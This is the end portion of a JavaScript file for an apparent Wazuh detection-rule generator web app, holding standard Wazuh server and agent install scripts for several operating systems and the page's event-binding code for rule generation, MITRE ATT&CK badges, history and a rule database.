  "sudo systemctl start wazuh-manager wazuh-indexer wazuh-dashboard",
  'echo "Done! https://$(curl -s ifconfig.me):443"',
].join("\n");
var INST_SRV_RH = [
  "# Wazuh Server — RHEL 9 / Rocky 9",
  'cat > /etc/yum.repos.d/wazuh.repo << "EOF"',
  "[wazuh]\ngpgcheck=1\ngpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUH\nenabled=1\nname=Wazuh repository\nbaseurl=https://packages.wazuh.com/4.x/yum/\nprotect=1\nEOF",
  "dnf install -y wazuh-manager wazuh-indexer wazuh-dashboard",
  "systemctl daemon-reload",
  "systemctl enable wazuh-manager wazuh-indexer wazuh-dashboard",
  "systemctl start wazuh-manager wazuh-indexer wazuh-dashboard",
].join("\n");
var INST_AG_LIN = [
  "# Wazuh Agent — Linux",
  '# WAZUH_MANAGER="192.168.1.10"',
  '# AGENT_GROUP="default"',
  'if grep -qi "debian|ubuntu" /etc/os-release 2>/dev/null; then',
  "    curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -",
  '    echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list',
  "    sudo apt-get update",
  '    sudo WAZUH_MANAGER="$WAZUH_MANAGER" apt-get install -y wazuh-agent',
  'elif grep -qi "rhel|centos|fedora|rocky|almalinux" /etc/os-release 2>/dev/null; then',
  "    dnf install -y wazuh-agent",
  "else",
  '    echo "Unsupported OS"; exit 1',
  "fi",
  "sudo systemctl daemon-reload",
  "sudo systemctl enable wazuh-agent",
  "sudo systemctl start wazuh-agent",
  'echo "Agent installed"',
].join("\n");
var INST_AG_WIN = [
  "# Wazuh Agent — Windows PowerShell",
  '$managerIp = "192.168.1.10"',
  '$agentVersion = "4.12.0"',
  '$url = "https://packages.wazuh.com/4.x/windows/wazuh-agent-$agentVersion-1.msi"',
  '$output = "$env:TEMP\\wazuh-agent.msi"',
  "Invoke-WebRequest -Uri $url -OutFile $output",
  'Start-Process msiexec.exe -ArgumentList "/i `"$output`" /quiet WAZUH_MANAGER=$managerIp" -Wait',
  'Start-Service -Name "WazuhSvc"',
  'Set-Service -Name "WazuhSvc" -StartupType Automatic',
].join("\n");
var INST_AG_MAC = [
  "# Wazuh Agent — macOS",
  '# WAZUH_MANAGER="192.168.1.10"',
  "curl -sO https://packages.wazuh.com/4.x/macos/wazuh-agent-4.12.0-1.pkg",
  "sudo installer -pkg wazuh-agent-4.12.0-1.pkg -target /",
  "sudo /Library/Ossec/bin/wazuh-control start",
].join("\n");

// ==================== EVENT BINDINGS ====================
function bindEvents() {
  getEl("instServerPre").textContent = INST_SRV_UB;
  getEl("instAgentPre").textContent = INST_AG_LIN;
  renderDB();

  // Nav
  document
    .querySelectorAll(".nav-links button[data-sec]")
    .forEach(function (b) {
      b.addEventListener("click", function () {
        showSection(this.dataset.sec);
      });
    });
  // Hamburger
  getEl("navToggle").addEventListener("click", function () {
    getEl("navLinks").classList.toggle("open");
  });
  document
    .querySelectorAll(".nav-links button[data-sec]")
    .forEach(function (b) {
      b.addEventListener("click", function () {
        getEl("navLinks").classList.remove("open");
      });
    });
  getEl("navBrand").addEventListener("click", function (e) {
    e.preventDefault();
    showSection("generator");
    getEl("navLinks").classList.remove("open");
  });
  getEl("themeBtn").addEventListener("click", toggleTheme);

  // Examples
  getEl("exBtns").addEventListener("click", function (e) {
    var btn = e.target.closest("button");
    if (!btn || !exData[btn.dataset.key]) return;
    getEl("logInput").value = exData[btn.dataset.key];
    document.querySelectorAll("#mitreBadges .badge").forEach(function (b) {
      b.classList.remove("active");
    });
    selMitre = [];
  });

  // MITRE badges (auto-generated from MITRE_TECH)
  var mbHtml = "";
  var sortedTech = MITRE_TECH.slice().sort(function (a, b) {
    return a.id.localeCompare(b.id);
  });
  for (var mi = 0; mi < sortedTech.length; mi++) {
    mbHtml +=
      '<button class="badge" data-m="' +
      sortedTech[mi].id +
      '">' +
      sortedTech[mi].id +
      " " +
      sortedTech[mi].name +
      "</button>";
  }
  getEl("mitreBadges").innerHTML = mbHtml;

  getEl("mitreBadges").addEventListener("click", function (e) {
    var b = e.target.closest(".badge");
    if (!b) return;
    b.classList.toggle("active");
    var id = b.dataset.m;
    if (b.classList.contains("active")) {
      if (selMitre.indexOf(id) === -1) selMitre.push(id);
    } else {
      var idx = selMitre.indexOf(id);
      if (idx !== -1) selMitre.splice(idx, 1);
    }
  });

  // Generate / Reset
  getEl("genBtn").addEventListener("click", generateRule);
  getEl("resetBtn").addEventListener("click", resetAll);

  // Output tabs
  getEl("outTabs").addEventListener("click", function (e) {
    var b = e.target.closest("button");
    if (!b) return;
    this.querySelectorAll("button").forEach(function (t) {
      t.classList.remove("active");
    });
    b.classList.add("active");
    switchTab(b.dataset.tab);
  });
  getEl("copyBtn").addEventListener("click", copyOutput);
  getEl("validateBtn").addEventListener("click", validateXml);
  getEl("editBtn").addEventListener("click", function () {
    if (curTab === "editor") return;
    switchTab("editor");
    document.querySelectorAll("#outTabs button").forEach(function (t) {
      t.classList.remove("active");
    });
    document
      .querySelector('#outTabs button[data-tab="editor"]')
      .classList.add("active");
  });

  // Save editor changes back
  getEl("outEditor").addEventListener("input", function () {
    genData.rule = this.value;
  });

  // Save to history on generate
  var origGen = generateRule;
  generateRule = function () {
    origGen();
    var log = getEl("logInput").value.trim();
    if (!log) return;
    var det = detectType(log);
    var name = det ? det.name : "Custom Log";
    var hist = JSON.parse(localStorage.getItem("wazgenHistory") || "[]");
    hist.unshift({
      id: getEl("ruleId").value - 1,
      name: name,
      log: log.substring(0, 80),
      time: new Date().toISOString(),
      rule: genData.rule,
    });
    if (hist.length > 50) hist = hist.slice(0, 50);
    localStorage.setItem("wazgenHistory", JSON.stringify(hist));
  };

  // History
  getEl("historyClear").addEventListener("click", function () {
    if (confirm("Hapus semua riwayat?")) {
      localStorage.removeItem("wazgenHistory");
      renderHistory();
      toast("Riwayat dihapus");
    }
  });

  function renderHistory() {
    var hist = JSON.parse(localStorage.getItem("wazgenHistory") || "[]");
    var empty = getEl("historyEmpty");
    var list = getEl("historyList");
    var items = getEl("historyItems");
    var count = getEl("historyCount");
    if (hist.length === 0) {
      empty.style.display = "block";
      list.style.display = "none";
      return;
    }
    empty.style.display = "none";
    list.style.display = "block";
    count.textContent = hist.length + " item";
    items.innerHTML = hist
      .map(function (h, i) {
        var d = new Date(h.time);
        var t = d.toLocaleDateString() + " " + d.toLocaleTimeString();
        return (
          '<div class="dbi" onclick="loadHistory(' +
          i +
          ')" style="cursor:pointer">' +
          '<div class="db-item-name">[ID ' +
          h.id +
          "] " +
          h.name +
          "</div>" +
          '<div style="font-size:10px;color:var(--muted2);margin:2px 0">' +
          t +
          "</div>" +
          '<div style="font-size:10px;color:var(--muted);font-family:var(--mono)">' +
          h.log +
          "</div></div>"
        );
      })
      .join("");
  }

  window.loadHistory = function (idx) {
    var hist = JSON.parse(localStorage.getItem("wazgenHistory") || "[]");
    var h = hist[idx];
    if (!h) return;
    genData = {
      rule: h.rule,
      decoder: "",
      ossec: "",
      test: "",
      editor: h.rule,
    };
    getEl("ruleId").value = h.id;
    getEl("logInput").value = h.log;
    getEl("metaCards").innerHTML =
      '<div class="meta-card"><div class="meta-label">Rule ID</div><div class="meta-value">' +
      h.id +
      "</div></div>" +
      '<div class="meta-card"><div class="meta-label">Type</div><div class="meta-value" style="font-size:11px">' +
      h.name +
      "</div></div>" +
      '<div class="meta-card"><div class="meta-label">Source</div><div class="meta-value" style="font-size:10px">History</div></div>';
    getEl("outPanel").style.display = "block";
    switchTab("rule");
    showSection("generator");
    toast("Loaded from history");
  };

  // Override showSection to render history
  var origShow = showSection;
  showSection = function (name) {
    origShow(name);
    if (name === "history") renderHistory();
  };

  // Batch
  getEl("batchBtn").addEventListener("click", handleBatchFile);
  getEl("batchCopyAll").addEventListener("click", function () {
    var t = getEl("batchOutput").textContent;
    if (!t) return;
    if (navigator.clipboard)
      navigator.clipboard.writeText(t).then(function () {
        toast("Copied all!");
      });
  });

  // DB
  getEl("dbSearch").addEventListener("input", renderDB);
  getEl("catFilter").innerHTML = DB_CATS.map(function (c) {
    return (
      "<button" +
      (c.id === "all" ? ' class="active"' : "") +
      ' data-cat="' +
      c.id +
      '">' +
      c.name +
      "</button>"
    );
  }).join("");
  getEl("catFilter").addEventListener("click", function (e) {
    var b = e.target.closest("button");
    if (!b) return;
    this.querySelectorAll("button").forEach(function (bt) {
      bt.classList.remove("active");
    });
    b.classList.add("active");
    renderDB();
  });
  getEl("ddClose").addEventListener("click", function () {
    getEl("dbDetail").style.display = "none";
  });

  // MITRE map filter
  getEl("mitreTacticFilter").addEventListener("click", function (e) {
    var b = e.target.closest("button");
    if (!b) return;
    this.querySelectorAll("button").forEach(function (bt) {
      bt.classList.remove("active");
    });
    b.classList.add("active");
    renderMitreMap();
  });

  // Install
  getEl("instUbuntu").addEventListener("click", function () {
    getEl("instServerPre").textContent = INST_SRV_UB;
    this.className = "btn-sm btn-primary";
    getEl("instRhel").className = "btn-sm btn-secondary";
  });
  getEl("instRhel").addEventListener("click", function () {
    getEl("instServerPre").textContent = INST_SRV_RH;
    this.className = "btn-sm btn-primary";
    getEl("instUbuntu").className = "btn-sm btn-secondary";
  });
  getEl("agentLinux").addEventListener("click", function () {
    getEl("instAgentPre").textContent = INST_AG_LIN;
    this.className = "btn-sm btn-primary";
    getEl("agentWindows").className = "btn-sm btn-secondary";
    getEl("agentMacos").className = "btn-sm btn-secondary";
  });
  getEl("agentWindows").addEventListener("click", function () {
    getEl("instAgentPre").textContent = INST_AG_WIN;
    this.className = "btn-sm btn-primary";
    getEl("agentLinux").className = "btn-sm btn-secondary";
    getEl("agentMacos").className = "btn-sm btn-secondary";
  });
  getEl("agentMacos").addEventListener("click", function () {
    getEl("instAgentPre").textContent = INST_AG_MAC;
    this.className = "btn-sm btn-primary";
    getEl("agentLinux").className = "btn-sm btn-secondary";
    getEl("agentWindows").className = "btn-sm btn-secondary";
  });

  // Copy buttons
  document.querySelectorAll(".copy-btn").forEach(function (btn) {
    btn.addEventListener("click", function () {
      var pre = this.parentElement.querySelector("pre");
      if (!pre) return;
      if (navigator.clipboard)
        navigator.clipboard.writeText(pre.textContent).then(function () {
          toast("Copied!");
        });
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", bindEvents);
} else {
  bindEvents();
}
